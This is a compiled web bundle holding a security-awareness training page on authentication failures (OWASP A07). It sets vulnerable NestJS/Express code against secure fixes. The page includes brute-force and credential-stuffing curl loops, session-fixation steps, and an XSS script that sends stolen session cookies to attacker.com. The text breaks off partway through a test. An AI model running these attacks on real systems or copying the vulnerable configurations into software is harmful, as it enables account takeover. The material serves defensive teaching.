"use strict";(globalThis.webpackChunkdocs_site=globalThis.webpackChunkdocs_site||[]).push([[27911],{28453(e,n,s){s.d(n,{R:()=>a,x:()=>o});var t=s(96540);const i={},r=t.createContext(i);function a(e){const n=t.useContext(r);return t.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:a(e.components),t.createElement(r.Provider,{value:n},e.children)}},67113(e,n,s){s.r(n),s.d(n,{assets:()=>c,contentTitle:()=>o,default:()=>u,frontMatter:()=>a,metadata:()=>t,toc:()=>l});const t=JSON.parse('{"id":"security-practices/training/security-awareness/a07-authentication-failures","title":"A07: Identification and Authentication Failures - Real Scenarios","description":"Overview","source":"@site/docs/security-practices/training/security-awareness/a07-authentication-failures.md","sourceDirName":"security-practices/training/security-awareness","slug":"/security-practices/training/security-awareness/a07-authentication-failures","permalink":"/fullstack-dev/docs/security-practices/training/security-awareness/a07-authentication-failures","draft":false,"unlisted":false,"editUrl":"https://github.com/tamnk74/fullstack-dev/tree/main/docs-site/docs/security-practices/training/security-awareness/a07-authentication-failures.md","tags":[],"version":"current","frontMatter":{},"sidebar":"tutorialSidebar","previous":{"title":"A06: Insecure Design - Real Scenarios","permalink":"/fullstack-dev/docs/security-practices/training/security-awareness/a06-insecure-design"},"next":{"title":"A08: Software and Data Integrity Failures - Real Scenarios","permalink":"/fullstack-dev/docs/security-practices/training/security-awareness/a08-software-data-integrity-failures"}}');var i=s(74848),r=s(28453);const a={},o="A07: Identification and Authentication Failures - Real Scenarios",c={},l=[{value:"Overview",id:"overview",level:2},{value:"Key Concepts",id:"key-concepts",level:2},{value:"Vulnerable Scenario 1: Weak Password Policy and No Account Protection",id:"vulnerable-scenario-1-weak-password-policy-and-no-account-protection",level:2},{value:"Vulnerable Code (NestJS)",id:"vulnerable-code-nestjs",level:3},{value:"Attack Examples",id:"attack-examples",level:3},{value:"Secure Solution",id:"secure-solution",level:3},{value:"Vulnerable Scenario 2: Session Fixation and Hijacking",id:"vulnerable-scenario-2-session-fixation-and-hijacking",level:2},{value:"Vulnerable Code (Express.js)",id:"vulnerable-code-expressjs",level:3},{value:"Attack Example: Session Fixation",id:"attack-example-session-fixation",level:3},{value:"Attack Example: Session Hijacking (XSS)",id:"attack-example-session-hijacking-xss",level:3},{value:"Secure Solution",id:"secure-solution-1",level:3},{value:"Vulnerable Scenario 3: Missing Multi-Factor Authentication",id:"vulnerable-scenario-3-missing-multi-factor-authentication",level:2},{value:"Vulnerable Code",id:"vulnerable-code",level:3},{value:"Secure Solution with 2FA",id:"secure-solution-with-2fa",level:3},{value:"Prevention Checklist",id:"prevention-checklist",level:2},{value:"Testing Methods",id:"testing-methods",level:2},{value:"Real-World Impact Examples",id:"real-world-impact-examples",level:2},{value:"References",id:"references",level:2}];function d(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",input:"input",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,r.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.header,{children:(0,i.jsx)(n.h1,{id:"a07-identification-and-authentication-failures---real-scenarios",children:"A07: Identification and Authentication Failures - Real Scenarios"})}),"\n",(0,i.jsx)(n.h2,{id:"overview",children:"Overview"}),"\n",(0,i.jsx)(n.p,{children:"Authentication and session management failures allow attackers to compromise passwords, keys, or session tokens, or exploit implementation flaws to assume other users' identities temporarily or permanently."}),"\n",(0,i.jsx)(n.h2,{id:"key-concepts",children:"Key Concepts"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Weak password policies"}),": Allowing simple passwords"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Credential stuffing"}),": Using breached credentials from other sites"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Session fixation"}),": Hijacking or fixing session identifiers"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Broken authentication"}),": Flawed login/logout mechanisms"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Missing multi-factor authentication"}),": No second factor verification"]}),"\n"]}),"\n",(0,i.jsx)(n.h2,{id:"vulnerable-scenario-1-weak-password-policy-and-no-account-protection",children:"Vulnerable Scenario 1: Weak Password Policy and No Account Protection"}),"\n",(0,i.jsx)(n.h3,{id:"vulnerable-code-nestjs",children:"Vulnerable Code (NestJS)"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-typescript",children:"// auth.service.ts - VULNERABLE\nimport { Injectable } from '@nestjs/common';\nimport { InjectRepository } from '@nestjs/typeorm';\nimport { Repository } from 'typeorm';\nimport { User } from './entities/user.entity';\nimport * as bcrypt from 'bcrypt';\n\n@Injectable()\nexport class AuthService {\n  constructor(\n    @InjectRepository(User)\n    private userRepository: Repository<User>,\n  ) {}\n\n  // \u274c VULNERABLE: Weak password requirements\n  async register(email: string, password: string) {\n    // \u274c No password strength validation\n    if (password.length < 6) {\n      throw new BadRequestException('Password too short');\n    }\n\n    // \u274c Allows common passwords\n    const hashedPassword = await bcrypt.hash(password, 10);\n\n    const user = this.userRepository.create({\n      email,\n      password: hashedPassword,\n    });\n\n    await this.userRepository.save(user);\n    return { message: 'User created' };\n  }\n\n  // \u274c VULNERABLE: No rate limiting or lockout\n  async login(email: string, password: string) {\n    const user = await this.userRepository.findOne({\n      where: { email },\n      select: ['id', 'email', 'password'],\n    });\n\n    if (!user) {\n      throw new UnauthorizedException('Invalid credentials');\n    }\n\n    const isValid = await bcrypt.compare(password, user.password);\n\n    if (!isValid) {\n      // \u274c No failed attempt tracking\n      throw new UnauthorizedException('Invalid credentials');\n    }\n\n    // \u274c Weak session token\n    const token = Buffer.from(`${user.id}:${Date.now()}`).toString('base64');\n\n    return { token };\n  }\n}\n"})}),"\n",(0,i.jsx)(n.h3,{id:"attack-examples",children:"Attack Examples"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Attack 1: Brute force weak passwords\npasswords=("123456" "password" "12345678" "qwerty" "123456789" "12345" "1234" "111111" "1234567" "dragon")\n\nfor pwd in "${passwords[@]}"; do\n  response=$(curl -s -X POST https://api.example.com/auth/login \\\n    -H "Content-Type: application/json" \\\n    -d "{\\"email\\":\\"admin@example.com\\",\\"password\\":\\"$pwd\\"}")\n\n  if [[ $response == *"token"* ]]; then\n    echo "\u2705 Password found: $pwd"\n    break\n  fi\ndone\n\n# \u274c No rate limiting - attacker can try thousands of passwords\n\n# Attack 2: Credential stuffing\n# Using breached credentials from other sites\nwhile IFS=: read -r email password; do\n  curl -X POST https://api.example.com/auth/login \\\n    -H "Content-Type: application/json" \\\n    -d "{\\"email\\":\\"$email\\",\\"password\\":\\"$password\\"}"\ndone < breach.txt\n\n# \u274c Many users reuse passwords across sites\n\n# Attack 3: Weak token prediction\n# Token format: base64(userId:timestamp)\n# Attacker can decode and predict tokens\necho "MTIzOjE3MDk2NzY4MDAwMDA=" | base64 -d\n# Output: 123:1709676800000\n# \u274c Attacker can forge tokens for any user!\n'})}),"\n",(0,i.jsx)(n.h3,{id:"secure-solution",children:"Secure Solution"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-typescript",children:"// auth.service.ts - SECURE\nimport { Injectable } from '@nestjs/common';\nimport { InjectRepository } from '@nestjs/typeorm';\nimport { Repository } from 'typeorm';\nimport { User } from './entities/user.entity';\nimport { JwtService } from '@nestjs/jwt';\nimport * as bcrypt from 'bcrypt';\nimport * as crypto from 'crypto';\nimport { Cache } from 'cache-manager';\n\n@Injectable()\nexport class AuthService {\n  // \u2705 Password policy constants\n  private readonly MIN_PASSWORD_LENGTH = 12;\n  private readonly COMMON_PASSWORDS = new Set([\n    '123456',\n    'password',\n    '12345678',\n    'qwerty',\n    '123456789',\n    'password123',\n    'admin',\n    'letmein',\n    'welcome',\n    'monkey',\n    // ... load from file\n  ]);\n\n  constructor(\n    @InjectRepository(User)\n    private userRepository: Repository<User>,\n    private jwtService: JwtService,\n    @Inject(CACHE_MANAGER) private cacheManager: Cache,\n  ) {}\n\n  // \u2705 SECURE: Strong password validation\n  async register(email: string, password: string) {\n    // \u2705 Comprehensive password validation\n    this.validatePassword(password);\n\n    // \u2705 Check if email already exists\n    const existing = await this.userRepository.findOne({ where: { email } });\n    if (existing) {\n      throw new BadRequestException('Email already registered');\n    }\n\n    // \u2705 Check against known breached passwords (using HaveIBeenPwned API)\n    const isBreached = await this.checkPasswordBreach(password);\n    if (isBreached) {\n      throw new BadRequestException(\n        'This password has been exposed in a data breach. Please choose a different password.',\n      );\n    }\n\n    // \u2705 Strong hashing with salt\n    const hashedPassword = await bcrypt.hash(password, 12);\n\n    const user = this.userRepository.create({\n      email: email.toLowerCase().trim(),\n      password: hashedPassword,\n      emailVerified: false,\n      createdAt: new Date(),\n    });\n\n    await this.userRepository.save(user);\n\n    // \u2705 Send verification email\n    await this.sendVerificationEmail(user);\n\n    return {\n      message: 'Registration successful. Please check your email to verify your account.',\n    };\n  }\n\n  // \u2705 Validate password strength\n  private validatePassword(password: string): void {\n    const errors: string[] = [];\n\n    // Length check\n    if (password.length < this.MIN_PASSWORD_LENGTH) {\n      errors.push(`Password must be at least ${this.MIN_PASSWORD_LENGTH} characters`);\n    }\n\n    // Complexity checks\n    if (!/[A-Z]/.test(password)) {\n      errors.push('Password must contain at least one uppercase letter');\n    }\n\n    if (!/[a-z]/.test(password)) {\n      errors.push('Password must contain at least one lowercase letter');\n    }\n\n    if (!/[0-9]/.test(password)) {\n      errors.push('Password must contain at least one number');\n    }\n\n    if (!/[!@#$%^&*(),.?\":{}|<>]/.test(password)) {\n      errors.push('Password must contain at least one special character');\n    }\n\n    // Check for common passwords\n    if (this.COMMON_PASSWORDS.has(password.toLowerCase())) {\n      errors.push('This password is too common. Please choose a stronger password.');\n    }\n\n    // Check for sequential characters\n    if (/(.)\\1{2,}/.test(password)) {\n      errors.push('Password cannot contain repeated characters');\n    }\n\n    // Check for keyboard patterns\n    const patterns = ['qwerty', 'asdfgh', '12345', 'abcdef'];\n    if (patterns.some((pattern) => password.toLowerCase().includes(pattern))) {\n      errors.push('Password contains common patterns');\n    }\n\n    if (errors.length > 0) {\n      throw new BadRequestException(errors.join('. '));\n    }\n  }\n\n  // \u2705 Check against HaveIBeenPwned database\n  private async checkPasswordBreach(password: string): Promise<boolean> {\n    try {\n      // \u2705 Use k-anonymity model - only send first 5 chars of hash\n      const hash = crypto.createHash('sha1').update(password).digest('hex').toUpperCase();\n      const prefix = hash.substring(0, 5);\n      const suffix = hash.substring(5);\n\n      const response = await fetch(`https://api.pwnedpasswords.com/range/${prefix}`);\n\n      const text = await response.text();\n      const hashes = text.split('\\n');\n\n      // Check if our hash suffix appears in results\n      return hashes.some((line) => line.startsWith(suffix));\n    } catch (error) {\n      // \u2705 If API is down, log but don't block registration\n      console.error('Failed to check password breach:', error);\n      return false;\n    }\n  }\n\n  // \u2705 SECURE: Login with protection mechanisms\n  async login(email: string, password: string, ipAddress: string) {\n    // \u2705 Normalize email\n    const normalizedEmail = email.toLowerCase().trim();\n\n    // \u2705 Check rate limiting by IP\n    await this.checkRateLimit(ipAddress);\n\n    // \u2705 Check if account is locked\n    const lockKey = `account_lock:${normalizedEmail}`;\n    const isLocked = await this.cacheManager.get(lockKey);\n\n    if (isLocked) {\n      const ttl = await this.cacheManager.store.ttl(lockKey);\n      throw new UnauthorizedException(`Account is locked. Try again in ${Math.ceil(ttl / 60)} minutes.`);\n    }\n\n    // \u2705 Find user\n    const user = await this.userRepository.findOne({\n      where: { email: normalizedEmail },\n      select: [\n        'id',\n        'email',\n        'password',\n        'emailVerified',\n        'twoFactorEnabled',\n        'twoFactorSecret',\n        'failedLoginAttempts',\n      ],\n    });\n\n    if (!user) {\n      // \u2705 Constant-time response to prevent user enumeration\n      await bcrypt.hash(password, 12);\n      throw new UnauthorizedException('Invalid credentials');\n    }\n\n    // \u2705 Check email verification\n    if (!user.emailVerified) {\n      throw new UnauthorizedException('Please verify your email before logging in');\n    }\n\n    // \u2705 Verify password\n    const isValid = await bcrypt.compare(password, user.password);\n\n    if (!isValid) {\n      // \u2705 Track failed attempts\n      await this.handleFailedLogin(user, ipAddress);\n      throw new UnauthorizedException('Invalid credentials');\n    }\n\n    // \u2705 Reset failed attempts\n    await this.userRepository.update(user.id, {\n      failedLoginAttempts: 0,\n      lastLoginAt: new Date(),\n      lastLoginIp: ipAddress,\n    });\n\n    // \u2705 Check if 2FA is enabled\n    if (user.twoFactorEnabled) {\n      // Return temporary token for 2FA step\n      const tempToken = this.generateTempToken(user.id);\n      return {\n        requiresTwoFactor: true,\n        tempToken,\n      };\n    }\n\n    // \u2705 Generate secure JWT token\n    const accessToken = this.generateAccessToken(user);\n    const refreshToken = await this.generateRefreshToken(user);\n\n    // \u2705 Log successful login\n    await this.auditLog.create({\n      userId: user.id,\n      action: 'LOGIN_SUCCESS',\n      ipAddress,\n      timestamp: new Date(),\n    });\n\n    return {\n      accessToken,\n      refreshToken,\n      user: {\n        id: user.id,\n        email: user.email,\n      },\n    };\n  }\n\n  // \u2705 Rate limiting\n  private async checkRateLimit(ipAddress: string): Promise<void> {\n    const key = `login_attempts:${ipAddress}`;\n    const attempts = (await this.cacheManager.get<number>(key)) || 0;\n\n    if (attempts >= 5) {\n      throw new TooManyRequestsException('Too many login attempts. Please try again later.');\n    }\n\n    await this.cacheManager.set(key, attempts + 1, 900000); // 15 minutes\n  }\n\n  // \u2705 Handle failed login\n  private async handleFailedLogin(user: User, ipAddress: string): Promise<void> {\n    const attempts = (user.failedLoginAttempts || 0) + 1;\n\n    await this.userRepository.update(user.id, {\n      failedLoginAttempts: attempts,\n    });\n\n    // \u2705 Lock account after 5 failed attempts\n    if (attempts >= 5) {\n      const lockKey = `account_lock:${user.email}`;\n      await this.cacheManager.set(lockKey, true, 900000); // Lock for 15 minutes\n\n      // \u2705 Send security alert\n      await this.sendSecurityAlert(user, ipAddress);\n\n      // \u2705 Audit log\n      await this.auditLog.create({\n        userId: user.id,\n        action: 'ACCOUNT_LOCKED',\n        ipAddress,\n        reason: 'Too many failed login attempts',\n        timestamp: new Date(),\n      });\n    }\n  }\n\n  // \u2705 Generate secure JWT\n  private generateAccessToken(user: User): string {\n    return this.jwtService.sign(\n      {\n        sub: user.id,\n        email: user.email,\n        type: 'access',\n        jti: crypto.randomUUID(), // \u2705 Unique token ID\n      },\n      {\n        expiresIn: '15m', // \u2705 Short-lived access token\n        issuer: 'myapp.com',\n        audience: 'myapp.com',\n      },\n    );\n  }\n\n  // \u2705 Generate refresh token\n  private async generateRefreshToken(user: User): Promise<string> {\n    const token = crypto.randomBytes(32).toString('hex');\n    const hashedToken = crypto.createHash('sha256').update(token).digest('hex');\n\n    // \u2705 Store refresh token in database\n    await this.refreshTokenRepository.create({\n      userId: user.id,\n      token: hashedToken,\n      expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000), // 7 days\n      createdAt: new Date(),\n    });\n\n    return token;\n  }\n}\n"})}),"\n",(0,i.jsx)(n.h2,{id:"vulnerable-scenario-2-session-fixation-and-hijacking",children:"Vulnerable Scenario 2: Session Fixation and Hijacking"}),"\n",(0,i.jsx)(n.h3,{id:"vulnerable-code-expressjs",children:"Vulnerable Code (Express.js)"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-typescript",children:"// app.ts - VULNERABLE\nimport express from 'express';\nimport session from 'express-session';\n\nconst app = express();\n\n// \u274c VULNERABLE: Insecure session configuration\napp.use(\n  session({\n    secret: 'keyboard cat', // \u274c Weak secret\n    resave: true,\n    saveUninitialized: true,\n    cookie: {\n      secure: false, // \u274c Allows HTTP\n      httpOnly: false, // \u274c Accessible via JavaScript\n      maxAge: 30 * 24 * 60 * 60 * 1000, // \u274c 30 days - too long\n      sameSite: 'none', // \u274c No CSRF protection\n    },\n    // \u274c No session regeneration on login\n  }),\n);\n\n// \u274c VULNERABLE: Session fixation\napp.post('/login', async (req, res) => {\n  const { email, password } = req.body;\n\n  const user = await authenticateUser(email, password);\n\n  if (user) {\n    // \u274c Reuses existing session ID - vulnerable to fixation!\n    req.session.userId = user.id;\n    req.session.email = user.email;\n\n    res.json({ success: true });\n  } else {\n    res.status(401).json({ error: 'Invalid credentials' });\n  }\n});\n\n// \u274c VULNERABLE: No session validation\napp.get('/api/profile', (req, res) => {\n  // \u274c Only checks if session exists\n  if (req.session.userId) {\n    const user = getUser(req.session.userId);\n    res.json(user);\n  } else {\n    res.status(401).json({ error: 'Not authenticated' });\n  }\n});\n"})}),"\n",(0,i.jsx)(n.h3,{id:"attack-example-session-fixation",children:"Attack Example: Session Fixation"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# Step 1: Attacker gets a session ID\ncurl -c cookies.txt https://app.example.com/\n\n# cookies.txt now contains:\n# connect.sid=s%3A1234567890abcdef\n\n# Step 2: Attacker tricks victim to use this session\n# Sends phishing link:\nhttps://app.example.com/login?sessionid=s%3A1234567890abcdef\n\n# Step 3: Victim logs in with the fixed session\n# \u274c Session ID is NOT regenerated on login\n\n# Step 4: Attacker uses the same session ID\ncurl -b "connect.sid=s%3A1234567890abcdef" https://app.example.com/api/profile\n\n# \u274c Attacker is now logged in as the victim!\n'})}),"\n",(0,i.jsx)(n.h3,{id:"attack-example-session-hijacking-xss",children:"Attack Example: Session Hijacking (XSS)"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-html",children:"\x3c!-- Attacker injects malicious script --\x3e\n<script>\n  // \u274c httpOnly: false allows JavaScript access\n  const sessionId = document.cookie\n    .split('; ')\n    .find((row) => row.startsWith('connect.sid='))\n    .split('=')[1];\n\n  // Send stolen session to attacker\n  fetch('https://attacker.com/steal', {\n    method: 'POST',\n    body: JSON.stringify({ sessionId }),\n  });\n<\/script>\n"})}),"\n",(0,i.jsx)(n.h3,{id:"secure-solution-1",children:"Secure Solution"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-typescript",children:"// app.ts - SECURE\nimport express from 'express';\nimport session from 'express-session';\nimport RedisStore from 'connect-redis';\nimport { createClient } from 'redis';\nimport crypto from 'crypto';\n\nconst app = express();\n\n// \u2705 SECURE: Redis for session storage\nconst redisClient = createClient({\n  url: process.env.REDIS_URL,\n  password: process.env.REDIS_PASSWORD,\n});\nredisClient.connect();\n\n// \u2705 SECURE: Strong session configuration\napp.use(\n  session({\n    store: new RedisStore({ client: redisClient }),\n\n    // \u2705 Strong secret from environment\n    secret: process.env.SESSION_SECRET, // Must be 32+ random characters\n\n    resave: false,\n    saveUninitialized: false,\n\n    // \u2705 Generate custom session ID\n    genid: () => crypto.randomBytes(32).toString('hex'),\n\n    name: 'sessionId', // \u2705 Don't use default name\n\n    cookie: {\n      secure: process.env.NODE_ENV === 'production', // \u2705 HTTPS only in production\n      httpOnly: true, // \u2705 Not accessible via JavaScript\n      maxAge: 1 * 60 * 60 * 1000, // \u2705 1 hour - short-lived\n      sameSite: 'strict', // \u2705 CSRF protection\n      domain: process.env.COOKIE_DOMAIN,\n    },\n\n    // \u2705 Rolling expiration\n    rolling: true,\n  }),\n);\n\n// \u2705 SECURE: Session regeneration on login\napp.post('/login', async (req, res) => {\n  const { email, password } = req.body;\n\n  const user = await authenticateUser(email, password);\n\n  if (user) {\n    // \u2705 Destroy old session\n    const oldSessionId = req.session.id;\n\n    // \u2705 Regenerate session ID after login\n    req.session.regenerate(async (err) => {\n      if (err) {\n        return res.status(500).json({ error: 'Session error' });\n      }\n\n      // \u2705 Set session data\n      req.session.userId = user.id;\n      req.session.email = user.email;\n      req.session.createdAt = Date.now();\n      req.session.ipAddress = req.ip;\n      req.session.userAgent = req.headers['user-agent'];\n\n      // \u2705 Log session creation\n      await logSecurityEvent({\n        type: 'SESSION_CREATED',\n        userId: user.id,\n        sessionId: req.session.id,\n        oldSessionId,\n        ipAddress: req.ip,\n      });\n\n      req.session.save((err) => {\n        if (err) {\n          return res.status(500).json({ error: 'Session save error' });\n        }\n\n        res.json({\n          success: true,\n          user: {\n            id: user.id,\n            email: user.email,\n          },\n        });\n      });\n    });\n  } else {\n    res.status(401).json({ error: 'Invalid credentials' });\n  }\n});\n\n// \u2705 SECURE: Session validation middleware\napp.use(async (req, res, next) => {\n  if (req.session.userId) {\n    // \u2705 Validate session hasn't been tampered with\n    const isValid = await validateSession(req.session);\n\n    if (!isValid) {\n      req.session.destroy(() => {\n        res.status(401).json({ error: 'Invalid session' });\n      });\n      return;\n    }\n\n    // \u2705 Check for session hijacking indicators\n    if (req.session.ipAddress !== req.ip) {\n      await logSecurityEvent({\n        type: 'SESSION_IP_MISMATCH',\n        userId: req.session.userId,\n        sessionId: req.session.id,\n        originalIp: req.session.ipAddress,\n        currentIp: req.ip,\n      });\n\n      // \u2705 Require re-authentication\n      req.session.destroy(() => {\n        res.status(401).json({\n          error: 'Session invalid. Please log in again.',\n        });\n      });\n      return;\n    }\n\n    // \u2705 Check session age\n    const sessionAge = Date.now() - req.session.createdAt;\n    const maxAge = 24 * 60 * 60 * 1000; // 24 hours\n\n    if (sessionAge > maxAge) {\n      req.session.destroy(() => {\n        res.status(401).json({\n          error: 'Session expired. Please log in again.',\n        });\n      });\n      return;\n    }\n  }\n\n  next();\n});\n\n// \u2705 SECURE: Logout with session destruction\napp.post('/logout', (req, res) => {\n  const userId = req.session.userId;\n  const sessionId = req.session.id;\n\n  // \u2705 Destroy session\n  req.session.destroy(async (err) => {\n    if (err) {\n      return res.status(500).json({ error: 'Logout failed' });\n    }\n\n    // \u2705 Clear cookie\n    res.clearCookie('sessionId');\n\n    // \u2705 Log logout\n    await logSecurityEvent({\n      type: 'LOGOUT',\n      userId,\n      sessionId,\n    });\n\n    res.json({ success: true });\n  });\n});\n\n// \u2705 Session validation helper\nasync function validateSession(session: any): Promise<boolean> {\n  if (!session.userId || !session.createdAt) {\n    return false;\n  }\n\n  // \u2705 Check if session exists in Redis\n  const exists = await redisClient.exists(`sess:${session.id}`);\n  if (!exists) {\n    return false;\n  }\n\n  // \u2705 Verify user still exists and is active\n  const user = await getUserById(session.userId);\n  if (!user || !user.isActive) {\n    return false;\n  }\n\n  return true;\n}\n"})}),"\n",(0,i.jsx)(n.h2,{id:"vulnerable-scenario-3-missing-multi-factor-authentication",children:"Vulnerable Scenario 3: Missing Multi-Factor Authentication"}),"\n",(0,i.jsx)(n.h3,{id:"vulnerable-code",children:"Vulnerable Code"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-typescript",children:"// auth.controller.ts - VULNERABLE\n@Controller('auth')\nexport class AuthController {\n  // \u274c VULNERABLE: No 2FA option\n  @Post('login')\n  async login(@Body() credentials: LoginDto) {\n    const user = await this.authService.validateUser(credentials.email, credentials.password);\n\n    if (!user) {\n      throw new UnauthorizedException();\n    }\n\n    // \u274c Returns access immediately - no 2FA check\n    return {\n      accessToken: this.authService.generateToken(user),\n    };\n  }\n}\n"})}),"\n",(0,i.jsx)(n.h3,{id:"secure-solution-with-2fa",children:"Secure Solution with 2FA"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-typescript",children:"// auth.controller.ts - SECURE\nimport * as speakeasy from 'speakeasy';\nimport * as QRCode from 'qrcode';\n\n@Controller('auth')\nexport class AuthController {\n  constructor(private authService: AuthService) {}\n\n  // \u2705 Step 1: Username/password\n  @Post('login')\n  async login(@Body() credentials: LoginDto, @Ip() ipAddress: string) {\n    const result = await this.authService.login(credentials.email, credentials.password, ipAddress);\n\n    // \u2705 Check if 2FA is required\n    if (result.requiresTwoFactor) {\n      return {\n        requiresTwoFactor: true,\n        tempToken: result.tempToken,\n      };\n    }\n\n    return result;\n  }\n\n  // \u2705 Step 2: Verify 2FA code\n  @Post('verify-2fa')\n  @UseGuards(TempTokenGuard)\n  async verify2FA(@Body() body: Verify2FADto, @Request() req) {\n    const { code } = body;\n    const userId = req.user.id;\n\n    const user = await this.userRepository.findOne({\n      where: { id: userId },\n      select: ['id', 'email', 'twoFactorSecret'],\n    });\n\n    // \u2705 Verify TOTP code\n    const isValid = speakeasy.totp.verify({\n      secret: user.twoFactorSecret,\n      encoding: 'base32',\n      token: code,\n      window: 2, // Allow 1 minute clock skew\n    });\n\n    if (!isValid) {\n      throw new UnauthorizedException('Invalid 2FA code');\n    }\n\n    // \u2705 Generate final access token\n    const accessToken = this.authService.generateAccessToken(user);\n    const refreshToken = await this.authService.generateRefreshToken(user);\n\n    return {\n      accessToken,\n      refreshToken,\n      user: {\n        id: user.id,\n        email: user.email,\n      },\n    };\n  }\n\n  // \u2705 Setup 2FA\n  @Post('setup-2fa')\n  @UseGuards(JwtAuthGuard)\n  async setup2FA(@Request() req) {\n    const user = req.user;\n\n    // \u2705 Generate secret\n    const secret = speakeasy.generateSecret({\n      name: `MyApp (${user.email})`,\n      issuer: 'MyApp',\n    });\n\n    // \u2705 Generate QR code\n    const qrCode = await QRCode.toDataURL(secret.otpauth_url);\n\n    // \u2705 Store secret (encrypted)\n    await this.userRepository.update(user.id, {\n      twoFactorSecret: secret.base32,\n      twoFactorEnabled: false, // Not enabled until verified\n    });\n\n    return {\n      secret: secret.base32,\n      qrCode,\n    };\n  }\n\n  // \u2705 Enable 2FA after verification\n  @Post('enable-2fa')\n  @UseGuards(JwtAuthGuard)\n  async enable2FA(@Body() body: { code: string }, @Request() req) {\n    const user = await this.userRepository.findOne({\n      where: { id: req.user.id },\n      select: ['id', 'twoFactorSecret'],\n    });\n\n    // \u2705 Verify code before enabling\n    const isValid = speakeasy.totp.verify({\n      secret: user.twoFactorSecret,\n      encoding: 'base32',\n      token: body.code,\n      window: 2,\n    });\n\n    if (!isValid) {\n      throw new BadRequestException('Invalid code');\n    }\n\n    // \u2705 Enable 2FA\n    await this.userRepository.update(user.id, {\n      twoFactorEnabled: true,\n    });\n\n    // \u2705 Generate backup codes\n    const backupCodes = this.generateBackupCodes();\n    await this.saveBackupCodes(user.id, backupCodes);\n\n    return {\n      success: true,\n      backupCodes, // \u2705 Show once, user must save\n    };\n  }\n\n  private generateBackupCodes(count: number = 10): string[] {\n    const codes: string[] = [];\n    for (let i = 0; i < count; i++) {\n      codes.push(crypto.randomBytes(4).toString('hex').toUpperCase());\n    }\n    return codes;\n  }\n}\n"})}),"\n",(0,i.jsx)(n.h2,{id:"prevention-checklist",children:"Prevention Checklist"}),"\n",(0,i.jsxs)(n.ul,{className:"contains-task-list",children:["\n",(0,i.jsxs)(n.li,{className:"task-list-item",children:[(0,i.jsx)(n.input,{type:"checkbox",disabled:!0})," ",(0,i.jsx)(n.strong,{children:"Strong password policy"}),": Minimum 12 characters, complexity"]}),"\n",(0,i.jsxs)(n.li,{className:"task-list-item",children:[(0,i.jsx)(n.input,{type:"checkbox",disabled:!0})," ",(0,i.jsx)(n.strong,{children:"Breach detection"}),": Check against HaveIBeenPwned"]}),"\n",(0,i.jsxs)(n.li,{className:"task-list-item",children:[(0,i.jsx)(n.input,{type:"checkbox",disabled:!0})," ",(0,i.jsx)(n.strong,{children:"Multi-factor authentication"}),": Implement TOTP or SMS"]}),"\n",(0,i.jsxs)(n.li,{className:"task-list-item",children:[(0,i.jsx)(n.input,{type:"checkbox",disabled:!0})," ",(0,i.jsx)(n.strong,{children:"Account lockout"}),": Lock after failed attempts"]}),"\n",(0,i.jsxs)(n.li,{className:"task-list-item",children:[(0,i.jsx)(n.input,{type:"checkbox",disabled:!0})," ",(0,i.jsx)(n.strong,{children:"Rate limiting"}),": Prevent brute force attacks"]}),"\n",(0,i.jsxs)(n.li,{className:"task-list-item",children:[(0,i.jsx)(n.input,{type:"checkbox",disabled:!0})," ",(0,i.jsx)(n.strong,{children:"Session management"}),": Regenerate on login, use secure cookies"]}),"\n",(0,i.jsxs)(n.li,{className:"task-list-item",children:[(0,i.jsx)(n.input,{type:"checkbox",disabled:!0})," ",(0,i.jsx)(n.strong,{children:"Secure tokens"}),": Use cryptographically secure JWTs"]}),"\n",(0,i.jsxs)(n.li,{className:"task-list-item",children:[(0,i.jsx)(n.input,{type:"checkbox",disabled:!0})," ",(0,i.jsx)(n.strong,{children:"Password reset"}),": Secure token-based process"]}),"\n",(0,i.jsxs)(n.li,{className:"task-list-item",children:[(0,i.jsx)(n.input,{type:"checkbox",disabled:!0})," ",(0,i.jsx)(n.strong,{children:"Email verification"}),": Verify email addresses"]}),"\n",(0,i.jsxs)(n.li,{className:"task-list-item",children:[(0,i.jsx)(n.input,{type:"checkbox",disabled:!0})," ",(0,i.jsx)(n.strong,{children:"Security alerts"}),": Notify users of suspicious activity"]}),"\n",(0,i.jsxs)(n.li,{className:"task-list-item",children:[(0,i.jsx)(n.input,{type:"checkbox",disabled:!0})," ",(0,i.jsx)(n.strong,{children:"Audit logging"}),": Track authentication events"]}),"\n"]}),"\n",(0,i.jsx)(n.h2,{id:"testing-methods",children:"Testing Methods"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-typescript",children:"describe('Authentication Security', () => {\n  it('should reject weak passwords', async () => {\n    await expect(authService.register('test@example.com', 'weak')).rejects.toThrow();\n  });\n\n  it('should lock account after failed attempts', async () => {\n    for (let i = 0; i < 5; i++) {\n      try {\n        await authService.login('test@example.com', 'wrong', '127.0.0.1');\n      } catch {}\n    }\n\n    await expect(authService.login('test@example.com', 'correct', 